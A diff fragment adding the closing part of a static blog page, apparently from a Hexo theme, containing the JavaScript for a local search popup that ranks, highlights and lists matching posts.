+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
